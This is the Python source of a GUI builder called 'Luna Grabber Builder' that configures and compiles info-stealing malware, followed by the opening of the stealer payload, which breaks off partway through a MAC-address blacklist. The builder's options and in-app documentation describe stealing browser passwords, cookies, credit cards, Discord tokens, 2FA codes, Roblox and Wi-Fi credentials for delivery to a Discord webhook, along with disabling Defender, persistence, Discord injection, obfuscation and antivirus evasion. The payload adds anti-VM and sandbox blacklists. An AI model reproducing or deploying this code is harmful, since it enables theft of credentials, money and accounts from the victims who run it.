import copy
import logging
import os
import random
import re
import shutil
import string
import subprocess
import threading
import time
from tkinter import filedialog

import customtkinter
import pyuac
import requests
from PIL import Image

logging.basicConfig(
    level=logging.DEBUG,
    filename='luna.log',
    filemode='a',
    format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)


class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()

        self.title("Luna Grabber Builder")
        self.geometry("1000x550")
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        self.dark_mode()

        self.updated_dictionary = {
            "webhook": None,
            "ping": False,
            "pingtype": None,
            "fakeerror": False,
            "startup": False,
            "defender": False,
            "systeminfo": False,
            "backupcodes": False,
            "browser": False,
            "roblox": False,
            "obfuscation": False,
            "injection": False,
            "minecraft": False,
            "wifi": False,
            "killprotector": False,
            "antidebug_vm": False,
            "discord": False,
            "anti_spam": False,
            "self_destruct": False
        }

        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
        self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(60, 60))
        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(500, 150))
        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(20, 20))
        self.dashboard_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "home.png")), size=(30, 30))
        self.docs_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "clipboard.png")), size=(30, 30))
        self.help_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}luna.ico")

        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  Luna Grabber Builder", image=self.logo_image,
                                                             compound="left", font=customtkinter.CTkFont(size=15, weight="bold", family=self.font))
        self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)

        self.dashboard_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Builder",
                                                        font=customtkinter.CTkFont(family=self.font, size=13), fg_color="transparent",
                                                        text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                        image=self.dashboard_image, anchor="w", command=self.home_button_event)
        self.dashboard_button.grid(row=1, column=0, sticky="ew")

        self.frame_2_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Documentation", font=customtkinter.CTkFont(
            family=self.font, size=13), fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), image=self.docs_image, anchor="w", command=self.docs_button_event)
        self.frame_2_button.grid(row=2, column=0, sticky="ew")

        self.builder_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.builder_frame.grid_columnconfigure(0, weight=1)

        # Frame 1

        self.webhook_button = customtkinter.CTkEntry(self.builder_frame, width=570, height=35, font=customtkinter.CTkFont(
            size=15, family=self.font), placeholder_text="https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz")
        self.webhook_button.grid(row=0, column=0, sticky="nw", padx=15, pady=20)

        self.checkwebhook_button = customtkinter.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                           command=self.check_webhook_button,
                                                           fg_color="#5d11c3", hover_color="#5057eb", font=customtkinter.CTkFont(size=15, family=self.font))
        self.checkwebhook_button.grid(row=0, sticky="ne", padx=15, pady=20)

        self.all_options = customtkinter.CTkLabel(self.builder_frame, text="Builder Options", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
        self.all_options.grid(row=1, column=0, sticky="n", padx=15, pady=8)

        self.option_help = customtkinter.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color="#5d11c3", hover_color="#5057eb")
        self.option_help.grid(row=1, column=0, sticky="ne", padx=35, pady=15)

        self.ping = customtkinter.CTkCheckBox(self.builder_frame, text="Ping", font=customtkinter.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#5d11c3", hover_color="#5057eb")
        self.ping.grid(row=1, column=0, sticky="nw", padx=85, pady=160)

        self.pingtype = customtkinter.CTkOptionMenu(
            self.builder_frame, width=20, values=["Everyone", "Here"],
            font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
        self.pingtype.set(value="Here")
        self.pingtype.grid(row=1, column=0, sticky="nw", padx=160, pady=158)
        self.pingtype.configure(state="disabled")

        self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Fake Error", font=customtkinter.CTkFont(
            size=17, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
        self.error.grid(row=1, column=0, sticky="nw", padx=85, pady=115)

        self.startup = customtkinter.CTkCheckBox(
            self.builder_frame, text="Add To Startup", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.startup.grid(row=1, column=0, sticky="nw", padx=85, pady=70)

        self.defender = customtkinter.CTkCheckBox(
            self.builder_frame, text="Disable Defender", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.defender.grid(row=1, column=0, sticky="nw", padx=286, pady=70)

        self.killprotector = customtkinter.CTkCheckBox(
            self.builder_frame, text="Kill Protector", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.killprotector.grid(row=1, column=0, sticky="nw", padx=286, pady=115)

        self.antidebug_vm = customtkinter.CTkCheckBox(
            self.builder_frame, text="Anti Debug/Vm", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.antidebug_vm.grid(row=1, column=0, sticky="nw", padx=286, pady=160)

        self.discord = customtkinter.CTkCheckBox(
            self.builder_frame, text="Discord Info", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.discord.grid(row=1, column=0, sticky="ne", padx=110, pady=70)

        self.wifi = customtkinter.CTkCheckBox(self.builder_frame, text="Wifi Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#5d11c3", hover_color="#5057eb")
        self.wifi.grid(row=1, column=0, sticky="ne", padx=130, pady=115)

        self.minecraft = customtkinter.CTkCheckBox(
            self.builder_frame, text="Minecraft Info", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.minecraft.grid(row=1, column=0, sticky="ne", padx=99, pady=160)

        self.systeminfo = customtkinter.CTkCheckBox(
            self.builder_frame, text="System Info", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.systeminfo.grid(row=1, column=0, sticky="nw", padx=85, pady=205)

        self.backupcodes = customtkinter.CTkCheckBox(
            self.builder_frame, text="2FA Codes", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.backupcodes.grid(row=1, column=0, sticky="nw", padx=286, pady=205)

        self.browser = customtkinter.CTkCheckBox(
            self.builder_frame, text="Browser Info", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.browser.grid(row=1, column=0, sticky="ne", padx=107, pady=205)

        self.roblox = customtkinter.CTkCheckBox(self.builder_frame, text="Roblox Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                                fg_color="#5d11c3", hover_color="#5057eb", command=self.check_roblox)
        self.roblox.grid(row=1, column=0, sticky="nw", padx=85, pady=250)

        self.obfuscation = customtkinter.CTkCheckBox(
            self.builder_frame, text="Obfuscation", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb", command=self.check_cxfreeze)
        self.obfuscation.grid(row=1, column=0, sticky="nw", padx=286, pady=250)

        self.injection = customtkinter.CTkCheckBox(
            self.builder_frame, text="Injection", font=customtkinter.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.injection.grid(row=1, column=0, sticky="ne", padx=130, pady=250)

        self.antispam = customtkinter.CTkCheckBox(self.builder_frame, text="Anti Spam", font=customtkinter.CTkFont(size=17, family=self.font),
                                                  fg_color="#5d11c3", hover_color="#5057eb")
        self.antispam.grid(row=1, column=0, sticky="nw", padx=85, pady=295)

        self.self_destruct = customtkinter.CTkCheckBox(self.builder_frame, text="Self Destruct", font=customtkinter.CTkFont(size=17, family=self.font),
                                                       fg_color="#5d11c3", hover_color="#5057eb")
        self.self_destruct.grid(row=1, column=0, sticky="nw", padx=286, pady=295)

        self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#5d11c3", hover_color="#5057eb", command=self.check_pumper)
        self.pump.grid(row=1, column=0, sticky="ne", padx=112, pady=295)

        self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
        self.pump_size.grid(row=1, column=0, sticky="ne", padx=28, pady=294)
        self.pump_size.set("10mb")
        self.pump_size.configure(state="disabled")

        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", "cxfreeze", ".py"],
                                                    font=customtkinter.CTkFont(size=32, family=self.font), width=250, height=45,
                                                    fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=self.multi_commands)
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=340)
        self.fileopts.set("File Options")

        self.icon = customtkinter.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#5d11c3", hover_color="#5057eb",
                                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
        self.icon.grid(row=1, column=0, sticky="ne", padx=85, pady=340)
        self.icon.configure(state="disabled")

        self.filename = customtkinter.CTkEntry(self.builder_frame, width=250, font=customtkinter.CTkFont(size=33, family=self.font),
                                               placeholder_text="File Name")
        self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=410)

        self.build = customtkinter.CTkButton(self.builder_frame, width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                                             fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
        self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=410)

        self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.backupcodes, self.browser,
                           self.roblox, self.obfuscation, self.injection, self.minecraft, self.wifi, self.killprotector, self.antidebug_vm, self.discord]

        for checkbox in self.checkboxes:
            checkbox.bind("<Button-1>", self.update_config)

        # Frame 2

        self.second_frame = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.second_frame.grid_columnconfigure(0, weight=1)

        self.docs = customtkinter.CTkLabel(self.second_frame, text="Documentation", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
        self.docs.grid(row=1, column=0, sticky="n", padx=0, pady=10)

        self.docsbox = customtkinter.CTkTextbox(self.second_frame, width=725, height=485, font=customtkinter.CTkFont(size=12, weight="bold", family=self.font))
        self.docsbox.grid(row=1, column=0, sticky="n", padx=0, pady=55)
        self.docsbox.insert(
            "0.0",
            "Add To Startup:\nThis will add the file to the startup folder of the user so when they turn their pc on the file will run and their information will \nbe sent to your webhook again.\n\nFake Error:\nThis will make a fake error popup when the file is ran to make confuse the victim.\n\nPing:\nThis will ping you at the moment when information is being sent to your webhook.\n\nPing Type:\nThere are two options: @everyone and @here. @everyone pings everyone that can access that channel and @here pings \nactive people in that channel\n\nSystem Info:\nThis will get the user's pc information such as pc name, os, ip address, mac address, hwid, cpu, gpu and ram.\n\n2FA Codes:\nThis will get the user's discord authentification codes.\n\nBrowser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards.\n\nRoblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\nObfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\nInjection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\nMinecraft Info:\nThis will get the user's minecraft information such as their session info and user cache.\n\nWifi Info:\nThis will get the user's wifi information such as wifi passwords and wifi networks.\n\nKill Protector:\nThis will kill a discord protector that some people use so their token can't be taken but this bypasses that.\n\nAnti-Debug VM:\nThis will check if the user is using a virtual machine or if they are debugging this script and it will exit out to stop them.\n\nDiscord Info:\nThis will send you all the discord information for every account they have. This info consists of their email, phone number, if \nthey have 2fa enabled, if they have nitro and what type of nitro, token and any gift cards.\n\nAnti Spam:\nOnly allows the victim to open the file every 60 seconds so your webhook isnt rate limited or spammed.\n\nSelf Destruct:\nDeletes the file once it has ran so the victim can't run it again.\n\nFile Pumper:\nAdds more megabytes to the file to make the file appear to be something its not and also tricks some antiviruses.\n\nBuild Options:\nPyinstaller - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Single file, fast compilation time, easy to transfer.\nDisadvantages: Detected by antiviruses, large file size\n\nCxfreeze - Builds a executable file and frozen modules that have to be together for the executable to work\nAdvantages: Smaller file size, basically fully undetectable\nDisadvantages: Multiple files, slower compilation time, looks more suspicious")

        self.select_frame_by_name("home")

    def select_frame_by_name(self, name):
        self.dashboard_button.configure(fg_color=("gray75", "gray25") if name == "home" else "transparent")
        self.frame_2_button.configure(fg_color=("gray75", "gray25") if name == "frame_2" else "transparent")

        if name == "home":
            self.builder_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.builder_frame.grid_forget()
        if name == "frame_2":
            self.second_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.second_frame.grid_forget()

    def home_button_event(self):
        self.select_frame_by_name("home")

    def docs_button_event(self):
        self.select_frame_by_name("frame_2")

    def dark_mode(self):
        customtkinter.set_appearance_mode("dark")

    def verify_webhook(self):
        webhook = self.webhook_button.get()
        try:
            r = requests.get(webhook, timeout=5)
            if r.status_code == 200:
                return True
            else:
                logging.error(f"Webhook not valid. Status code: {r.status_code}. Webhook: {webhook}")
                return False
        except Exception as e:
            logging.error(f"Couldn't verify webhook: {e}")
            return False

    def check_webhook_button(self):
        if self.verify_webhook():
            self.checkwebhook_button.configure(width=100, height=35, fg_color="green", hover_color="#0db60e",
                                               text="Valid Webhook", font=customtkinter.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)
            self.updated_dictionary["webhook"] = self.webhook_button.get()
        else:
            self.checkwebhook_button.configure(width=100, height=35, fg_color="#bd1616", hover_color="#ff0000",
                                               text="Invalid Webhook", font=customtkinter.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)

    def check_ping(self):
        if self.ping.get() == 1:
            self.pingtype.configure(state="normal")
        else:
            self.pingtype.configure(state="disabled")

    def check_pumper(self):
        if self.pump.get() == 1:
            self.pump_size.configure(state="normal")
        else:
            self.pump_size.configure(state="disabled")

    def multi_commands(self, value):
        if value == "pyinstaller":
            self.check_icon()
        elif value == "cxfreeze":
            self.check_cxfreeze()
            self.check_icon()
        elif value == ".py":
            self.check_icon()

    def get_mb(self):
        self.mb = self.pump_size.get()
        byte_size = int(self.mb.replace("mb", ""))
        return byte_size

    def check_roblox(self):
        if self.roblox.get() == 1:
            self.browser.select()

    def check_icon(self):
        if self.fileopts.get() == "pyinstaller":
            self.icon.configure(state="normal")
        elif self.fileopts.get() == "cxfreeze":
            self.icon.configure(state="normal")
        elif self.fileopts.get() == ".py":
            self.icon.configure(state="disabled")

    def check_cxfreeze(self):
        if self.fileopts.get() == "cxfreeze":
            if self.obfuscation.get() == 1:
                self.obfuscation.deselect()

    def get_icon(self):
        self.iconpath = filedialog.askopenfilename(initialdir="/", title="Select Icon", filetypes=(("ico files", "*.ico"), ("all files", "*.*")))
        self.icon.configure(text="Added Icon")
        self.builder_frame.after(3500, self.reset_icon_button)

    def reset_icon_button(self):
        self.icon.configure(self.builder_frame, width=250, text="Add Icon", fg_color="#5d11c3", hover_color="#5057eb",
                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)

    def update_config(self, event):
        checkbox_mapping = {
            "webhook": self.webhook_button,
            "ping": self.ping,
            "pingtype": self.pingtype,
            "fakeerror": self.error,
            "startup": self.startup,
            "defender": self.defender,
            "systeminfo": self.systeminfo,
            "backupcodes": self.backupcodes,
            "browser": self.browser,
            "roblox": self.roblox,
            "obfuscation": self.obfuscation,
            "injection": self.injection,
            "minecraft": self.minecraft,
            "wifi": self.wifi,
            "killprotector": self.killprotector,
            "antidebug_vm": self.antidebug_vm,
            "discord": self.discord,
            "anti_spam": self.antispam,
            "self_destruct": self.self_destruct
        }

        for key, checkbox in checkbox_mapping.items():
            try:
                if checkbox.get():
                    if key == "webhook":
                        pass
                    else:
                        self.updated_dictionary[key] = True
                elif checkbox.get() == 0:
                    self.updated_dictionary[key] = False
                ping_message = self.pingtype.get()
                if ping_message in ["Here", "Everyone"]:
                    self.updated_dictionary["pingtype"] = ping_message
                elif self.ping.get() == 0:
                    self.updated_dictionary["pingtype"] = "None"
            except Exception as e:
                logging.error(f"Error with updating config: {e}")

    def get_filetype(self):
        try:
            file_type = self.fileopts.get()
            if file_type == ".py":
                logging.info(f"Changed filetype: {file_type}")
                return file_type.replace(".", "")
            else:
                logging.info(f"Changed filetype: {file_type}")
                return file_type
        except Exception as e:
            logging.error(f"Error with getting filetype: {e}")

    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color="#5d11c3", hover_color="#5057eb", text="Check Webhook")

    def reset_build_button(self):
        self.build.configure(width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                             fg_color="#5d11c3", hover_color="#5057eb")

    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
                time.sleep(0.3)
                self.update()

    def built_file(self):
        self.build.configure(width=250, text="Built File", font=customtkinter.CTkFont(size=35, family=self.font),
                             fg_color="#5d11c3", hover_color="#5057eb")

    def return_filename(self):
        try:
            get_file_name = self.filename.get()
            if not get_file_name:
                random_name = ''.join(random.choices(string.ascii_letters, k=5))
                logging.info(f"Retrieved filename: test-{random_name}")
                return f"test-{random_name}"
            else:
                logging.info(f"Retrieved filename: {get_file_name}")
                return get_file_name
        except Exception as e:
            logging.error(f"Error with getting filename: {e}")

    def get_config(self):
        try:
            with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
                code = f.read()

            config_regex = r"__CONFIG__\s*=\s*{(.*?)}"
            config_match = re.search(config_regex, code, re.DOTALL)
            if config_match:
                config = config_match.group(0)
            else:
                raise Exception("Could not find config in luna.py")

            copy_dict = copy.deepcopy(self.updated_dictionary)
            config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
            code = code.replace(config, config_str)
            logging.info(f"Successfully changed config")
            return code
        except Exception as e:
            logging.error(f"Error with config: {e}")

    def file_pumper(self, filename, extension, size):
        try:
            pump_size = size * 1024 ** 2
            with open(f"./{filename}.{extension}", 'ab') as f:
                for _ in range(int(pump_size)):
                    f.write((b'\x00'))
            logging.info(f"Successfully pumped file: {filename}.{extension}")
        except Exception as e:
            logging.error(f"Error with file pumper: {e}")

    def compile_file(self, filename, filetype):
        try:
            if self.iconpath is None:
                exeicon = "NONE"
            else:
                exeicon = self.iconpath

            if filetype == "pyinstaller":
                subprocess.run(["python", "./tools/upx.py"])
                subprocess.run(["python", "-m", "PyInstaller",
                                "--onefile", "--clean", "--noconsole",
                                "--upx-dir=./tools", "--distpath=./",
                                "--hidden-import", "base64",
                                "--hidden-import", "ctypes",
                                "--hidden-import", "json",
                                "--hidden-import", "re",
                                "--hidden-import", "time",
                                "--hidden-import", "subprocess",
                                "--hidden-import", "sys",
                                "--hidden-import", "sqlite3",
                                "--hidden-import", "requests_toolbelt",
                                "--hidden-import", "psutil",
                                "--hidden-import", "PIL",
                                "--hidden-import", "PIL.ImageGrab",
                                "--hidden-import", "Cryptodome",
                                "--hidden-import", "Cryptodome.Cipher",
                                "--hidden-import", "Cryptodome.Cipher.AES",
                                "--hidden-import", "win32crypt",
                                "--icon", exeicon, f"./{filename}.py"])
                logging.info(f"Successfully compiled {filename}.exe with pyinstaller")

            elif filetype == "cxfreeze":
                cmd_args = [
                    "cxfreeze",
                    f"{filename}.py",
                    "--target-name", filename,
                    "--base-name", "Win32GUI",
                    "--includes", "base64",
                    "--includes", "ctypes",
                    "--includes", "json",
                    "--includes", "re",
                    "--includes", "time",
                    "--includes", "subprocess",
                    "--includes", "sys",
                    "--includes", "sqlite3",
                    "--includes", "requests_toolbelt",
                    "--includes", "psutil",
                    "--includes", "PIL",
                    "--includes", "PIL.ImageGrab",
                    "--includes", "Cryptodome",
                    "--includes", "Cryptodome.Cipher",
                    "--includes", "Cryptodome.Cipher.AES",
                    "--includes", "win32crypt"
                ]
                if exeicon != "NONE":
                    cmd_args += ["--icon", exeicon]
                subprocess.run(cmd_args)
                logging.info(f"Successfully compiled {filename}.exe with cxfreeze")
        except Exception as e:
            logging.error(f"Error with compiling file: {e}")

    def cleanup_files(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.spec', f'./{filename}.py', "./tools/upx.exe"}

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
                    logging.info(f"Successfully removed directory: {clean}")
            except Exception as e:
                logging.error(f"Couldn't remove directory: {clean}. {e}")
                pass
                continue
        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
                    logging.info(f"Successfully removed file: {clean}")
            except Exception as e:
                logging.error(f"Couldn't remove file: {clean}. {e}")
                pass
                continue

    def write_and_obfuscate(self, filename):
        try:
            with open(f"./{filename}.py", 'w', encoding="utf-8") as f:
                f.write(self.get_config())

            if self.obfuscation.get() == 1:
                os.system(f"python ./tools/obfuscation.py ./{filename}.py")
                os.remove(f"./{filename}.py")
                os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")
                logging.info(f"Successfully obfuscated file: {filename}.py")
        except Exception as e:
            logging.error(f"Error with writing and obfuscating file: {e}")

    def buildfile(self):
        try:
            filename = self.return_filename()

            if self.get_filetype() == "py":
                self.write_and_obfuscate(filename)

                if self.pump.get() == 1:
                    self.file_pumper(filename, "py", self.get_mb())

                self.built_file()
                self.builder_frame.after(3000, self.reset_build_button)

            elif self.get_filetype() == "pyinstaller":
                self.write_and_obfuscate(filename)

                thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
                thread.start()
                self.building_button_thread(thread)

                if self.pump.get() == 1:
                    self.file_pumper(filename, "exe", self.get_mb())

                self.built_file()
                self.builder_frame.after(3000, self.reset_build_button)
                self.cleanup_files(filename)

            elif self.get_filetype() == "cxfreeze":
                self.write_and_obfuscate(filename)

                thread = threading.Thread(target=self.compile_file, args=(filename, "cxfreeze",))
                thread.start()
                self.building_button_thread(thread)

                if self.pump.get() == 1:
                    self.file_pumper(filename, "exe", self.get_mb())

                self.built_file()
                self.builder_frame.after(3000, self.reset_build_button)
                os.remove(f"./{filename}.py")
        except Exception as e:
            logging.error(f"Error with building file: {e}")


if __name__ == "__main__":
    if not pyuac.isUserAdmin():
        logging.error("File must be run with admin privileges")
        pyuac.runAsAdmin()
    else:
        app = App()
        app.mainloop()
import os
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import time
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import sys
import shutil
import uuid
import socket
import getpass
import ssl



ssl._create_default_https_context = ssl._create_unverified_context

blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']

username = getpass.getuser()

if username.lower() in blacklistUsers:
    os._exit(0)

def kontrol():

    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']

    hostname = socket.gethostname()

    if any(name in hostname for name in blacklistUsername):
        os._exit(0)

kontrol()

BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', 